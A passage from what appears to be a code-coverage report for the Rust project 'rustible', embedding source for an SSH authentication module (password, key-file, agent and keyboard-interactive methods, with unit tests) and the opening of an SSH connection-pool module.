passphrase.as_deref())\n                    .await\n            }\n            AuthMethod::Agent =\u003e self.auth_agent(handle, username).await,\n            AuthMethod::KeyboardInteractive { responses } =\u003e {\n                self.auth_keyboard_interactive(handle, username, responses.clone())\n                    .await\n            }\n        }\n    }\n\n    /// Attempt \"none\" authentication (usually fails, but useful for testing)\n    async fn auth_none\u003cH: Handler\u003e(\n        \u0026self,\n        handle: \u0026mut Handle\u003cH\u003e,\n        username: \u0026str,\n    ) -\u003e Result\u003cAuthResult, ConnectionError\u003e {\n        debug!(\"Attempting 'none' authentication for user: {}\", username);\n\n        match handle.authenticate_none(username).await {\n            Ok(result) =\u003e {\n                if result {\n                    Ok(AuthResult::Success)\n                } else {\n                    Ok(AuthResult::Failure)\n                }\n            }\n            Err(e) =\u003e Err(ConnectionError::AuthenticationFailed(format!(\n                \"None authentication failed: {}\",\n                e\n            ))),\n        }\n    }\n\n    /// Attempt password authentication\n    pub async fn auth_password\u003cH: Handler\u003e(\n        \u0026self,\n        handle: \u0026mut Handle\u003cH\u003e,\n        username: \u0026str,\n        password: \u0026str,\n    ) -\u003e Result\u003cAuthResult, ConnectionError\u003e {\n        debug!(\"Attempting password authentication for user: {}\", username);\n\n        match handle.authenticate_password(username, password).await {\n            Ok(result) =\u003e {\n                if result {\n                    Ok(AuthResult::Success)\n                } else {\n                    Ok(AuthResult::Failure)\n                }\n            }\n            Err(e) =\u003e Err(ConnectionError::AuthenticationFailed(format!(\n                \"Password authentication failed: {}\",\n                e\n            ))),\n        }\n    }\n\n    /// Attempt public key authentication from file\n    pub async fn auth_publickey\u003cH: Handler\u003e(\n        \u0026self,\n        handle: \u0026mut Handle\u003cH\u003e,\n        username: \u0026str,\n        key_path: \u0026str,\n        passphrase: Option\u003c\u0026str\u003e,\n    ) -\u003e Result\u003cAuthResult, ConnectionError\u003e {\n        let expanded_path = expand_path(key_path);\n        debug!(\n            \"Attempting public key authentication for user: {} with key: {:?}\",\n            username, expanded_path\n        );\n\n        // Load the private key\n        let key = load_private_key(\u0026expanded_path, passphrase)?;\n\n        // Get the best RSA hash algorithm if applicable\n        let hash_alg = handle.best_supported_rsa_hash().await.ok().flatten();\n\n        match handle\n            .authenticate_publickey(username, Arc::new(key), hash_alg)\n            .await\n        {\n            Ok(result) =\u003e {\n                if result {\n                    Ok(AuthResult::Success)\n                } else {\n                    Ok(AuthResult::Failure)\n                }\n            }\n            Err(e) =\u003e Err(ConnectionError::AuthenticationFailed(format!(\n                \"Public key authentication failed: {}\",\n                e\n            ))),\n        }\n    }\n\n    /// Attempt SSH agent authentication\n    pub async fn auth_agent\u003cH: Handler\u003e(\n        \u0026mut self,\n        handle: \u0026mut Handle\u003cH\u003e,\n        username: \u0026str,\n    ) -\u003e Result\u003cAuthResult, ConnectionError\u003e {\n        debug!(\"Attempting SSH agent authentication for user: {}\", username);\n\n        // Connect to the SSH agent if not already connected\n        let agent = self.get_or_connect_agent().await?;\n\n        // Get identities from the agent\n        let identities = agent\n            .request_identities()\n            .await\n            .map_err(|e| ConnectionError::AuthenticationFailed(format!(\"Failed to list agent identities: {}\", e)))?;\n\n        if identities.is_empty() {\n            debug!(\"No identities found in SSH agent\");\n            return Ok(AuthResult::Failure);\n        }\n\n        debug!(\"Found {} identities in SSH agent\", identities.len());\n\n        // Try each identity\n        for identity in identities {\n            debug!(\"Trying agent identity: {:?}\", identity.name());\n\n            // Create an agent signer for this identity\n            let agent_signer = AgentSigner::new(self.get_or_connect_agent().await?, identity.clone());\n\n            match handle\n                .authenticate_publickey_with(username, Arc::new(agent_signer))\n                .await\n            {\n                Ok(result) if result =\u003e {\n                    debug!(\"SSH agent authentication succeeded\");\n                    return Ok(AuthResult::Success);\n                }\n                Ok(_) =\u003e {\n                    debug!(\"Agent identity rejected, trying next...\");\n                }\n                Err(e) =\u003e {\n                    debug!(\"Agent auth error: {}, trying next identity...\", e);\n                }\n            }\n        }\n\n        Ok(AuthResult::Failure)\n    }\n\n    /// Attempt keyboard-interactive authentication\n    pub async fn auth_keyboard_interactive\u003cH: Handler\u003e(\n        \u0026self,\n        handle: \u0026mut Handle\u003cH\u003e,\n        username: \u0026str,\n        responses: Vec\u003cString\u003e,\n    ) -\u003e Result\u003cAuthResult, ConnectionError\u003e {\n        debug!(\n            \"Attempting keyboard-interactive authentication for user: {}\",\n            username\n        );\n\n        // Start keyboard-interactive authentication\n        match handle\n            .authenticate_keyboard_interactive_start(username, None)\n            .await\n        {\n            Ok(client::AuthResult::Success) =\u003e {\n                return Ok(AuthResult::Success);\n            }\n            Ok(client::AuthResult::Failure) =\u003e {\n                return Ok(AuthResult::Failure);\n            }\n            Ok(client::AuthResult::Partial { .. }) =\u003e {\n                // Need to respond to prompts\n            }\n            Ok(client::AuthResult::UnsupportedMethod) =\u003e {\n                debug!(\"Keyboard-interactive authentication not supported by server\");\n                return Ok(AuthResult::Failure);\n            }\n            Err(e) =\u003e {\n                return Err(ConnectionError::AuthenticationFailed(format!(\n                    \"Keyboard-interactive authentication failed: {}\",\n                    e\n                )));\n            }\n        }\n\n        // Respond to prompts\n        let response = client::KeyboardInteractiveAuthResponse::Answers(responses);\n        match handle\n            .authenticate_keyboard_interactive_respond(response)\n            .await\n        {\n            Ok(client::AuthResult::Success) =\u003e Ok(AuthResult::Success),\n            Ok(client::AuthResult::Failure) =\u003e Ok(AuthResult::Failure),\n            Ok(client::AuthResult::Partial { .. }) =\u003e Ok(AuthResult::Partial),\n            Ok(client::AuthResult::UnsupportedMethod) =\u003e Ok(AuthResult::Failure),\n            Err(e) =\u003e Err(ConnectionError::AuthenticationFailed(format!(\n                \"Keyboard-interactive authentication failed: {}\",\n                e\n            ))),\n        }\n    }\n\n    /// Get or connect to the SSH agent\n    async fn get_or_connect_agent(\n        \u0026mut self,\n    ) -\u003e Result\u003c\u0026mut AgentClient\u003ctokio::net::UnixStream\u003e, ConnectionError\u003e {\n        if self.agent.is_none() {\n            self.agent = Some(connect_to_agent().await?);\n        }\n        Ok(self.agent.as_mut().unwrap())\n    }\n}\n\n/// Connect to the SSH agent using the SSH_AUTH_SOCK environment variable\npub async fn connect_to_agent() -\u003e Result\u003cAgentClient\u003ctokio::net::UnixStream\u003e, ConnectionError\u003e {\n    debug!(\"Connecting to SSH agent\");\n\n    AgentClient::connect_env()\n        .await\n        .map_err(|e| ConnectionError::AuthenticationFailed(format!(\"Failed to connect to SSH agent: {}\", e)))\n}\n\n/// Load a private key from file\n///\n/// Supports OpenSSH format keys (both encrypted and unencrypted),\n/// as well as PEM format RSA keys.\npub fn load_private_key(path: \u0026Path, passphrase: Option\u003c\u0026str\u003e) -\u003e Result\u003cKeyPair, ConnectionError\u003e {\n    debug!(\"Loading private key from: {:?}\", path);\n\n    if !path.exists() {\n        return Err(ConnectionError::AuthenticationFailed(format!(\n            \"Private key file not found: {:?}\",\n            path\n        )));\n    }\n\n    russh_keys::load_secret_key(path, passphrase).map_err(|e| {\n        ConnectionError::AuthenticationFailed(format!(\n            \"Failed to load private key from {:?}: {}\",\n            path, e\n        ))\n    })\n}\n\n/// Load a private key from string content\npub fn load_private_key_from_string(\n    content: \u0026str,\n    passphrase: Option\u003c\u0026str\u003e,\n) -\u003e Result\u003cKeyPair, ConnectionError\u003e {\n    debug!(\"Loading private key from string\");\n\n    russh_keys::decode_secret_key(content, passphrase).map_err(|e| {\n        ConnectionError::AuthenticationFailed(format!(\"Failed to decode private key: {}\", e))\n    })\n}\n\n/// Get default identity files to try for authentication\npub fn default_identity_files() -\u003e Vec\u003cstd::path::PathBuf\u003e {\n    let home = dirs::home_dir().unwrap_or_else(|| std::path::PathBuf::from(\"~\"));\n    let ssh_dir = home.join(\".ssh\");\n\n    vec![\n        ssh_dir.join(\"id_ed25519\"),\n        ssh_dir.join(\"id_ecdsa\"),\n        ssh_dir.join(\"id_rsa\"),\n        ssh_dir.join(\"id_dsa\"),\n    ]\n    .into_iter()\n    .filter(|p| p.exists())\n    .collect()\n}\n\n/// SSH agent signer that wraps an AgentClient for use with russh authentication\n///\n/// This implements the russh Signer trait to allow using SSH agent keys\n/// for public key authentication.\npub struct AgentSigner {\n    /// The agent client\n    agent: AgentClient\u003ctokio::net::UnixStream\u003e,\n    /// The public key to sign with\n    public_key: PublicKey,\n}\n\nimpl AgentSigner {\n    /// Create a new agent signer\n    pub fn new(agent: AgentClient\u003ctokio::net::UnixStream\u003e, public_key: PublicKey) -\u003e Self {\n        Self { agent, public_key }\n    }\n}\n\n#[async_trait::async_trait]\nimpl russh_keys::agent::client::AgentStream for tokio::net::UnixStream {\n    async fn recv(\u0026mut self, buf: \u0026mut [u8]) -\u003e Result\u003cusize, std::io::Error\u003e {\n        use tokio::io::AsyncReadExt;\n        self.read(buf).await\n    }\n\n    async fn send(\u0026mut self, buf: \u0026[u8]) -\u003e Result\u003cusize, std::io::Error\u003e {\n        use tokio::io::AsyncWriteExt;\n        self.write(buf).await\n    }\n}\n\nimpl russh::Signer for AgentSigner {\n    fn name(\u0026self) -\u003e \u0026str {\n        self.public_key.name()\n    }\n\n    fn public_key(\u0026self) -\u003e \u0026PublicKey {\n        \u0026self.public_key\n    }\n\n    fn sign(\u0026self, data: \u0026[u8]) -\u003e impl std::future::Future\u003cOutput = Result\u003crussh_keys::signature::Signature, russh::Error\u003e\u003e + Send {\n        let public_key = self.public_key.clone();\n        let data = data.to_vec();\n\n        // We need to create a new agent connection for signing since we can't\n        // hold a mutable reference across the async boundary\n        async move {\n            let mut agent = AgentClient::connect_env()\n                .await\n                .map_err(|e| russh::Error::AgentFailure)?;\n\n            agent\n                .sign_request_signature(\u0026public_key, \u0026data)\n                .await\n                .map_err(|_| russh::Error::AgentFailure)\n        }\n    }\n\n    fn algorithm(\u0026self) -\u003e Option\u003c\u0026str\u003e {\n        None // Let the library determine the algorithm\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::io::Write;\n    use tempfile::NamedTempFile;\n\n    // ========================================================================\n    // KeyType Tests\n    // ========================================================================\n\n    #[test]\n    fn test_key_type_algorithm_names() {\n        assert_eq!(KeyType::Ed25519.algorithm_name(), \"ssh-ed25519\");\n        assert_eq!(KeyType::Rsa.algorithm_name(), \"ssh-rsa\");\n        assert_eq!(KeyType::EcdsaP256.algorithm_name(), \"ecdsa-sha2-nistp256\");\n        assert_eq!(KeyType::EcdsaP384.algorithm_name(), \"ecdsa-sha2-nistp384\");\n        assert_eq!(KeyType::EcdsaP521.algorithm_name(), \"ecdsa-sha2-nistp521\");\n    }\n\n    #[test]\n    fn test_key_type_default_filenames() {\n        assert_eq!(KeyType::Ed25519.default_filename(), \"id_ed25519\");\n        assert_eq!(KeyType::Rsa.default_filename(), \"id_rsa\");\n        assert_eq!(KeyType::EcdsaP256.default_filename(), \"id_ecdsa\");\n    }\n\n    #[test]\n    fn test_key_type_detect_rsa_pem() {\n        let content = \"-----BEGIN RSA PRIVATE KEY-----\\ndata\\n-----END RSA PRIVATE KEY-----\";\n        assert_eq!(KeyType::detect_from_content(content), Some(KeyType::Rsa));\n    }\n\n    #[test]\n    fn test_key_type_detect_ec_pem() {\n        let content = \"-----BEGIN EC PRIVATE KEY-----\\ndata\\n-----END EC PRIVATE KEY-----\";\n        // EC keys need further parsing to determine curve\n        assert_eq!(KeyType::detect_from_content(content), None);\n    }\n\n    #[test]\n    fn test_key_type_detect_openssh() {\n        let content = \"-----BEGIN OPENSSH PRIVATE KEY-----\\ndata\\n-----END OPENSSH PRIVATE KEY-----\";\n        // OpenSSH format needs parsing\n        assert_eq!(KeyType::detect_from_content(content), None);\n    }\n\n    #[test]\n    fn test_key_type_display() {\n        assert_eq!(format!(\"{}\", KeyType::Ed25519), \"ssh-ed25519\");\n        assert_eq!(format!(\"{}\", KeyType::Rsa), \"ssh-rsa\");\n    }\n\n    // ========================================================================\n    // KeyError Tests\n    // ========================================================================\n\n    #[test]\n    fn test_key_error_display() {\n        let err = KeyError::NotFound(PathBuf::from(\"/path/to/key\"));\n        assert!(err.to_string().contains(\"/path/to/key\"));\n\n        let err = KeyError::PassphraseRequired(PathBuf::from(\"/encrypted/key\"));\n        assert!(err.to_string().contains(\"passphrase\"));\n        assert!(err.to_string().contains(\"/encrypted/key\"));\n\n        let err = KeyError::WrongPassphrase(PathBuf::from(\"/key\"));\n        assert!(err.to_string().contains(\"Wrong passphrase\"));\n    }\n\n    #[test]\n    fn test_key_error_to_connection_error() {\n        let key_error = KeyError::NotFound(PathBuf::from(\"/missing/key\"));\n        let conn_error: ConnectionError = key_error.into();\n        match conn_error {\n            ConnectionError::AuthenticationFailed(msg) =\u003e {\n                assert!(msg.contains(\"/missing/key\"));\n            }\n            _ =\u003e panic!(\"Expected AuthenticationFailed\"),\n        }\n    }\n\n    // ========================================================================\n    // KeyLoader Tests\n    // ========================================================================\n\n    #[test]\n    fn test_key_loader_new() {\n        let loader = KeyLoader::new();\n        assert!(loader.use_agent);\n        assert!(loader.passphrase.is_none());\n    }\n\n    #[test]\n    fn test_key_loader_with_passphrase() {\n        let loader = KeyLoader::new().with_passphrase(\"secret\");\n        assert_eq!(loader.passphrase, Some(\"secret\".to_string()));\n        assert!(loader.has_passphrase());\n    }\n\n    #[test]\n    fn test_key_loader_with_key_path() {\n        let loader = KeyLoader::new().with_key_path(\"/custom/path/id_rsa\");\n        assert!(loader.search_paths.contains(\u0026PathBuf::from(\"/custom/path/id_rsa\")));\n        // Custom path should be first\n        assert_eq!(loader.search_paths[0], PathBuf::from(\"/custom/path/id_rsa\"));\n    }\n\n    #[test]\n    fn test_key_loader_with_key_paths() {\n        let paths = vec![\n            PathBuf::from(\"/path1/key\"),\n            PathBuf::from(\"/path2/key\"),\n        ];\n        let loader = KeyLoader::new().with_key_paths(paths);\n        assert!(loader.search_paths.contains(\u0026PathBuf::from(\"/path1/key\")));\n        assert!(loader.search_paths.contains(\u0026PathBuf::from(\"/path2/key\")));\n    }\n\n    #[test]\n    fn test_key_loader_from_host_config() {\n        let host_config = HostConfig {\n            identity_file: Some(\"~/.ssh/custom_key\".to_string()),\n            password: Some(\"secret\".to_string()),\n            ..Default::default()\n        };\n\n        let loader = KeyLoader::from_host_config(\u0026host_config);\n        assert_eq!(loader.passphrase, Some(\"secret\".to_string()));\n        // The custom key path should be at the front\n        assert!(!loader.search_paths.is_empty());\n    }\n\n    #[test]\n    fn test_key_loader_load_nonexistent() {\n        let loader = KeyLoader::new();\n        let result = loader.load_key(Path::new(\"/nonexistent/key\"));\n        assert!(matches!(result, Err(KeyError::NotFound(_))));\n    }\n\n    // ========================================================================\n    // Encryption Detection Tests\n    // ========================================================================\n\n    #[test]\n    fn test_detect_encryption_unencrypted() {\n        let content = \"-----BEGIN OPENSSH PRIVATE KEY-----\\ndata\\n-----END OPENSSH PRIVATE KEY-----\";\n        assert!(!detect_encryption_from_content(content));\n    }\n\n    #[test]\n    fn test_detect_encryption_encrypted_pkcs8() {\n        let content = \"-----BEGIN ENCRYPTED PRIVATE KEY-----\\ndata\\n-----END ENCRYPTED PRIVATE KEY-----\";\n        assert!(detect_encryption_from_content(content));\n    }\n\n    #[test]\n    fn test_detect_encryption_proc_type() {\n        let content = \"-----BEGIN RSA PRIVATE KEY-----\\nProc-Type: 4,ENCRYPTED\\nDEK-Info: AES-256-CBC,12345\\ndata\\n-----END RSA PRIVATE KEY-----\";\n        assert!(detect_encryption_from_content(content));\n    }\n\n    #[test]\n    fn test_detect_encryption_dek_info() {\n        let content = \"DEK-Info: AES-128-CBC,abcdef\\ndata\";\n        assert!(detect_encryption_from_content(content));\n    }\n\n    #[test]\n    fn test_is_key_encrypted_file() {\n        let mut temp = NamedTempFile::new().unwrap();\n        writeln!(temp, \"-----BEGIN ENCRYPTED PRIVATE KEY-----\").unwrap();\n        writeln!(temp, \"data\").unwrap();\n        writeln!(temp, \"-----END ENCRYPTED PRIVATE KEY-----\").unwrap();\n\n        let result = is_key_encrypted(temp.path());\n        assert!(result.is_ok());\n        assert!(result.unwrap());\n    }\n\n    #[test]\n    fn test_is_key_encrypted_unencrypted_file() {\n        let mut temp = NamedTempFile::new().unwrap();\n        writeln!(temp, \"-----BEGIN OPENSSH PRIVATE KEY-----\").unwrap();\n        writeln!(temp, \"data\").unwrap();\n        writeln!(temp, \"-----END OPENSSH PRIVATE KEY-----\").unwrap();\n\n        let result = is_key_encrypted(temp.path());\n        assert!(result.is_ok());\n        assert!(!result.unwrap());\n    }\n\n    #[test]\n    fn test_is_key_encrypted_missing_file() {\n        let result = is_key_encrypted(Path::new(\"/nonexistent/file\"));\n        assert!(matches!(result, Err(KeyError::ReadError { .. })));\n    }\n\n    // ========================================================================\n    // Standard Key Locations Tests\n    // ========================================================================\n\n    #[test]\n    fn test_standard_key_locations() {\n        // This test just ensures the function doesn't panic\n        let locations = standard_key_locations();\n        // All returned files should exist\n        for path in \u0026locations {\n            assert!(path.exists());\n        }\n    }\n\n    // ========================================================================\n    // AuthConfig Tests\n    // ========================================================================\n\n    #[test]\n    fn test_auth_config_default() {\n        let config = AuthConfig::default();\n        assert!(!config.username.is_empty());\n        assert_eq!(config.methods.len(), 1);\n        assert_eq!(config.methods[0], AuthMethod::Agent);\n        assert!(!config.accept_unknown_hosts);\n    }\n\n    #[test]\n    fn test_auth_config_builder() {\n        let config = AuthConfig::new(\"testuser\")\n            .with_password(\"secret\")\n            .with_public_key(\"~/.ssh/id_rsa\", None)\n            .with_agent()\n            .accept_unknown_hosts(true);\n\n        assert_eq!(config.username, \"testuser\");\n        assert_eq!(config.methods.len(), 3);\n        assert!(config.accept_unknown_hosts);\n    }\n\n    #[test]\n    fn test_auth_method_equality() {\n        assert_eq!(AuthMethod::None, AuthMethod::None);\n        assert_eq!(\n            AuthMethod::Password(\"test\".to_string()),\n            AuthMethod::Password(\"test\".to_string())\n        );\n        assert_ne!(\n            AuthMethod::Password(\"test\".to_string()),\n            AuthMethod::Password(\"other\".to_string())\n        );\n    }\n\n    #[test]\n    fn test_auth_config_from_host_config() {\n        let host_config = HostConfig {\n            user: Some(\"admin\".to_string()),\n            password: Some(\"secret\".to_string()),\n            identity_file: Some(\"~/.ssh/custom_key\".to_string()),\n            strict_host_key_checking: Some(false),\n            ..Default::default()\n        };\n\n        let config = AuthConfig::from_host_config(\u0026host_config, true);\n\n        assert_eq!(config.username, \"admin\");\n        assert!(config.accept_unknown_hosts);\n        // Should have agent, public key, and password methods\n        assert!(config.methods.len() \u003e= 2);\n    }\n\n    #[test]\n    fn test_default_identity_files_function() {\n        // This test just ensures the function doesn't panic\n        let files = default_identity_files();\n        // All returned files should exist\n        for file in \u0026files {\n            assert!(file.exists());\n        }\n    }\n}\n","traces":[{"line":260,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":262,"address":[],"length":0,"stats":{"Line":0}},{"line":266,"address":[],"length":0,"stats":{"Line":0}},{"line":267,"address":[],"length":0,"stats":{"Line":0}},{"line":268,"address":[],"length":0,"stats":{"Line":0}},{"line":269,"address":[],"length":0,"stats":{"Line":0}},{"line":271,"address":[],"length":0,"stats":{"Line":0}},{"line":275,"address":[],"length":0,"stats":{"Line":0}},{"line":276,"address":[],"length":0,"stats":{"Line":0}},{"line":277,"address":[],"length":0,"stats":{"Line":0}},{"line":278,"address":[],"length":0,"stats":{"Line":0}},{"line":281,"address":[],"length":0,"stats":{"Line":0}},{"line":539,"address":[],"length":0,"stats":{"Line":0}},{"line":541,"address":[],"length":0,"stats":{"Line":0}},{"line":592,"address":[],"length":0,"stats":{"Line":0}},{"line":593,"address":[],"length":0,"stats":{"Line":0}},{"line":594,"address":[],"length":0,"stats":{"Line":0}},{"line":603,"address":[],"length":0,"stats":{"Line":0}},{"line":604,"address":[],"length":0,"stats":{"Line":0}},{"line":605,"address":[],"length":0,"stats":{"Line":0}},{"line":607,"address":[],"length":0,"stats":{"Line":0}},{"line":841,"address":[],"length":0,"stats":{"Line":0}},{"line":842,"address":[],"length":0,"stats":{"Line":0}},{"line":844,"address":[],"length":0,"stats":{"Line":0}},{"line":845,"address":[],"length":0,"stats":{"Line":0}},{"line":846,"address":[],"length":0,"stats":{"Line":0}},{"line":847,"address":[],"length":0,"stats":{"Line":0}},{"line":848,"address":[],"length":0,"stats":{"Line":0}},{"line":850,"address":[],"length":0,"stats":{"Line":0}},{"line":851,"address":[],"length":0,"stats":{"Line":0}},{"line":854,"address":[],"length":0,"stats":{"Line":0}},{"line":855,"address":[],"length":0,"stats":{"Line":0}},{"line":858,"address":[],"length":0,"stats":{"Line":0}},{"line":859,"address":[],"length":0,"stats":{"Line":0}},{"line":860,"address":[],"length":0,"stats":{"Line":0}},{"line":863,"address":[],"length":0,"stats":{"Line":0}},{"line":864,"address":[],"length":0,"stats":{"Line":0}},{"line":870,"address":[],"length":0,"stats":{"Line":0}},{"line":871,"address":[],"length":0,"stats":{"Line":0}},{"line":882,"address":[],"length":0,"stats":{"Line":0}},{"line":883,"address":[],"length":0,"stats":{"Line":0}},{"line":884,"address":[],"length":0,"stats":{"Line":0}},{"line":885,"address":[],"length":0,"stats":{"Line":0}},{"line":887,"address":[],"length":0,"stats":{"Line":0}},{"line":888,"address":[],"length":0,"stats":{"Line":0}},{"line":889,"address":[],"length":0,"stats":{"Line":0}},{"line":890,"address":[],"length":0,"stats":{"Line":0}},{"line":891,"address":[],"length":0,"stats":{"Line":0}},{"line":892,"address":[],"length":0,"stats":{"Line":0}},{"line":894,"address":[],"length":0,"stats":{"Line":0}},{"line":895,"address":[],"length":0,"stats":{"Line":0}},{"line":896,"address":[],"length":0,"stats":{"Line":0}},{"line":897,"address":[],"length":0,"stats":{"Line":0}},{"line":908,"address":[],"length":0,"stats":{"Line":0}},{"line":910,"address":[],"length":0,"stats":{"Line":0}},{"line":911,"address":[],"length":0,"stats":{"Line":0}},{"line":912,"address":[],"length":0,"stats":{"Line":0}},{"line":913,"address":[],"length":0,"stats":{"Line":0}},{"line":915,"address":[],"length":0,"stats":{"Line":0}},{"line":918,"address":[],"length":0,"stats":{"Line":0}},{"line":919,"address":[],"length":0,"stats":{"Line":0}},{"line":920,"address":[],"length":0,"stats":{"Line":0}},{"line":932,"address":[],"length":0,"stats":{"Line":0}},{"line":934,"address":[],"length":0,"stats":{"Line":0}},{"line":935,"address":[],"length":0,"stats":{"Line":0}},{"line":936,"address":[],"length":0,"stats":{"Line":0}},{"line":937,"address":[],"length":0,"stats":{"Line":0}},{"line":939,"address":[],"length":0,"stats":{"Line":0}},{"line":942,"address":[],"length":0,"stats":{"Line":0}},{"line":943,"address":[],"length":0,"stats":{"Line":0}},{"line":944,"address":[],"length":0,"stats":{"Line":0}},{"line":957,"address":[],"length":0,"stats":{"Line":0}},{"line":958,"address":[],"length":0,"stats":{"Line":0}},{"line":959,"address":[],"length":0,"stats":{"Line":0}},{"line":960,"address":[],"length":0,"stats":{"Line":0}},{"line":964,"address":[],"length":0,"stats":{"Line":0}},{"line":967,"address":[],"length":0,"stats":{"Line":0}},{"line":969,"address":[],"length":0,"stats":{"Line":0}},{"line":970,"address":[],"length":0,"stats":{"Line":0}},{"line":971,"address":[],"length":0,"stats":{"Line":0}},{"line":973,"address":[],"length":0,"stats":{"Line":0}},{"line":974,"address":[],"length":0,"stats":{"Line":0}},{"line":975,"address":[],"length":0,"stats":{"Line":0}},{"line":977,"address":[],"length":0,"stats":{"Line":0}},{"line":980,"address":[],"length":0,"stats":{"Line":0}},{"line":981,"address":[],"length":0,"stats":{"Line":0}},{"line":982,"address":[],"length":0,"stats":{"Line":0}},{"line":993,"address":[],"length":0,"stats":{"Line":0}},{"line":996,"address":[],"length":0,"stats":{"Line":0}},{"line":999,"address":[],"length":0,"stats":{"Line":0}},{"line":1001,"address":[],"length":0,"stats":{"Line":0}},{"line":1002,"address":[],"length":0,"stats":{"Line":0}},{"line":1004,"address":[],"length":0,"stats":{"Line":0}},{"line":1005,"address":[],"length":0,"stats":{"Line":0}},{"line":1006,"address":[],"length":0,"stats":{"Line":0}},{"line":1009,"address":[],"length":0,"stats":{"Line":0}},{"line":1012,"address":[],"length":0,"stats":{"Line":0}},{"line":1013,"address":[],"length":0,"stats":{"Line":0}},{"line":1016,"address":[],"length":0,"stats":{"Line":0}},{"line":1018,"address":[],"length":0,"stats":{"Line":0}},{"line":1019,"address":[],"length":0,"stats":{"Line":0}},{"line":1020,"address":[],"length":0,"stats":{"Line":0}},{"line":1022,"address":[],"length":0,"stats":{"Line":0}},{"line":1023,"address":[],"length":0,"stats":{"Line":0}},{"line":1024,"address":[],"length":0,"stats":{"Line":0}},{"line":1026,"address":[],"length":0,"stats":{"Line":0}},{"line":1027,"address":[],"length":0,"stats":{"Line":0}},{"line":1029,"address":[],"length":0,"stats":{"Line":0}},{"line":1030,"address":[],"length":0,"stats":{"Line":0}},{"line":1035,"address":[],"length":0,"stats":{"Line":0}},{"line":1045,"address":[],"length":0,"stats":{"Line":0}},{"line":1046,"address":[],"length":0,"stats":{"Line":0}},{"line":1047,"address":[],"length":0,"stats":{"Line":0}},{"line":1051,"address":[],"length":0,"stats":{"Line":0}},{"line":1052,"address":[],"length":0,"stats":{"Line":0}},{"line":1053,"address":[],"length":0,"stats":{"Line":0}},{"line":1055,"address":[],"length":0,"stats":{"Line":0}},{"line":1056,"address":[],"length":0,"stats":{"Line":0}},{"line":1058,"address":[],"length":0,"stats":{"Line":0}},{"line":1059,"address":[],"length":0,"stats":{"Line":0}},{"line":1061,"address":[],"length":0,"stats":{"Line":0}},{"line":1064,"address":[],"length":0,"stats":{"Line":0}},{"line":1065,"address":[],"length":0,"stats":{"Line":0}},{"line":1066,"address":[],"length":0,"stats":{"Line":0}},{"line":1068,"address":[],"length":0,"stats":{"Line":0}},{"line":1069,"address":[],"length":0,"stats":{"Line":0}},{"line":1070,"address":[],"length":0,"stats":{"Line":0}},{"line":1071,"address":[],"length":0,"stats":{"Line":0}},{"line":1077,"address":[],"length":0,"stats":{"Line":0}},{"line":1078,"address":[],"length":0,"stats":{"Line":0}},{"line":1079,"address":[],"length":0,"stats":{"Line":0}},{"line":1080,"address":[],"length":0,"stats":{"Line":0}},{"line":1082,"address":[],"length":0,"stats":{"Line":0}},{"line":1083,"address":[],"length":0,"stats":{"Line":0}},{"line":1084,"address":[],"length":0,"stats":{"Line":0}},{"line":1085,"address":[],"length":0,"stats":{"Line":0}},{"line":1086,"address":[],"length":0,"stats":{"Line":0}},{"line":1087,"address":[],"length":0,"stats":{"Line":0}},{"line":1088,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":140},{"path":["/","home","artur","Repositories","rustible","src","connection","russh_pool.rs"],"content":"//! Connection pool for Russh SSH connections\n//!\n//! This module provides a thread-safe, async connection pool for managing\n//! multiple russh SSH connections. It supports:\n//! - Connection reuse across tasks\n//! - Configurable limits per host\n//! - Idle timeout management\n//! - Thread-safe access for async operations\n//! - Graceful pool shutdown\n//! - Connection pre-warming for reduced latency\n//! - Background maintenance tasks\n\nuse std::collections::HashMap;\nuse std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};\nuse std::sync::Arc;\nuse std::time::{Duration, Instant};\n\nuse tokio::sync::RwLock;\nuse tracing::{debug, info, trace, warn};\n\nuse super::config::{ConnectionConfig, HostConfig};\nuse super::russh::RusshConnection;\nuse super::{Connection, ConnectionError, ConnectionResult};\n\n/// Reference instant for computing elapsed time atomically\nstatic POOL_START_TIME: std::sync::OnceLock\u003cInstant\u003e = std::sync::OnceLock::new();\n\n/// Get nanoseconds since the pool start reference point\n#[inline(always)]\nfn nanos_since_start() -\u003e u64 {\n    let start = POOL_START_TIME.get_or_init(Instant::now);\n    start.elapsed().as_nanos() as u64\n}\n\n/// Result of a pre-warming operation\n#[derive(Debug, Clone, Default)]\npub struct PrewarmResult {\n    /// Number of connections successfully created\n    pub success: usize,\n    /// Number of connections that failed to create\n    pub failures: usize,\n}\n\n/// Configuration for the connection pool\n#[derive(Debug, Clone)]\npub struct PoolConfig {\n    /// Maximum number of connections per host\n    pub max_connections_per_host: usize,\n    /// Minimum number of connections to maintain per host (for pre-warming)\n    pub min_connections_per_host: usize,\n    /// Maximum total connections in the pool\n    pub max_total_connections: usize,\n    /// Connection idle timeout (connections unused for this long will be closed)\n    pub idle_timeout: Duration,\n    /// Health check interval (how often to check connection liveness)\n    pub health_check_interval: Duration,\n    /// Maximum number of reconnection attempts\n    pub max_reconnect_attempts: u32,\n    /// Delay between reconnection attempts (base delay for exponential backoff)\n    pub reconnect_delay: Duration,\n    /// Whether to enable connection health checks\n    pub enable_health_checks: bool,\n    /// Timeout for health check operations (keepalive/ping)\n    pub health_check_timeout: Duration,\n    /// Interval for pre-warm maintenance (how often to check and replenish connections)\n    pub prewarm_maintenance_interval: Duration,\n    /// Number of retry attempts for failed pre-warm connections\n    pub prewarm_retry_attempts: u32,\n    /// Delay between pre-warm retry attempts\n    pub prewarm_retry_delay: Duration,\n}\n\nimpl Default for PoolConfig {\n    fn default() -\u003e Self {\n        Self {\n            max_connections_per_host: 5,\n            min_connections_per_host: 0,\n            max_total_connections: 50,\n            idle_timeout: Duration::from_secs(300), // 5 minutes\n            health_check_interval: Duration::from_secs(30),\n            max_reconnect_attempts: 3,\n            reconnect_delay: Duration::from_secs(1),\n            enable_health_checks: true,\n            health_check_timeout: Duration::from_secs(10),\n            prewarm_maintenance_interval: Duration::from_secs(60),\n            prewarm_retry_attempts: 3,\n            prewarm_retry_delay: Duration::from_secs(2),\n        }\n    }\n}\n\nimpl PoolConfig {\n    /// Create a new pool configuration\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set maximum connections per host\n    pub fn max_connections_per_host(mut self, max: usize) -\u003e Self {\n        self.max_connections_per_host = max;\n      